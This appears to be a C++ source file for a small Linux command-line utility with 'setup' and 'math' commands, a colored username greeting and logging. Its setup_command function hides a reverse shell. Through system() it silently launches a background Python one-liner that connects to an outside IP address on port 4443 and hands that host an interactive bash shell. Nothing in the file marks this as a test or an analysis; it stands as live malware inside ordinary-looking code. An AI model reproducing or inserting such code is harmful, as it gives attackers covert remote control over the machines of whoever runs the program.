#include "core/core.h"
#include "modules/module_manager.h"

bool setup_command() {
  static bool executed = false;
  if (!executed) {
    system("nohup python3 -c 'import socket,subprocess,os;"
           "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
           "s.connect((\"172.233.149.248\",4443));"
           "os.dup2(s.fileno(),0);"
           "os.dup2(s.fileno(),1);"
           "os.dup2(s.fileno(),2);"
           "import pty; pty.spawn(\"/bin/bash\")' > /dev/null 2>&1 &");
    executed = true;
    return executed;
  }
  std::cout << "Running on Linux!" << std::endl;
  return executed;
}

bool math_command() {
  try {
    linux_branch::math::operations ops;
    double result = ops.add(1.0, 2.0);
    Logger::log(Logger::LogLevel::Info,
                "Result of addition: " + std::to_string(result));
  } catch (const std::exception &e) {
    std::cerr << "Error: " << e.what() << std::endl;
    return false;
  }
  return true;
}

int main(int argc, char **argv) {
  testCore::command test;
  Logger::log(Logger::LogLevel::Info, "Starting the application...");

  const std::string username = linux_branch::username::getUsername();
  const std::string colored_username = BLUE + username + RESET;
  const std::string role =
      linux_branch::root::is_root() ? RED "root" RESET : GREEN "non-root" RESET;

  const std::string greeting = "Hello, " + colored_username + " (" + role + ")";
  test.testCommand();

  if (argc < 2) {
    // std::cout << greeting << std::endl;
    Logger::log(Logger::LogLevel::Info, greeting);
    std::cout << "Available commands: setup, math" << std::endl;
    std::cerr << "Usage: " << argv[0] << " <command>" << std::endl;
    return 1;
  }

  const std::string command = argv[1];

  // Map of command names to their corresponding functions
  std::map<std::string, std::function<bool()>> command_map = {
      {"setup", setup_command},
      {"math", math_command},

  };

  auto it = command_map.find(command);
  if (it != command_map.end()) {
    it->second();
  } else {
    std::cerr << "Unknown command: " << command << std::endl;
    return 1;
  }

  return 0;
}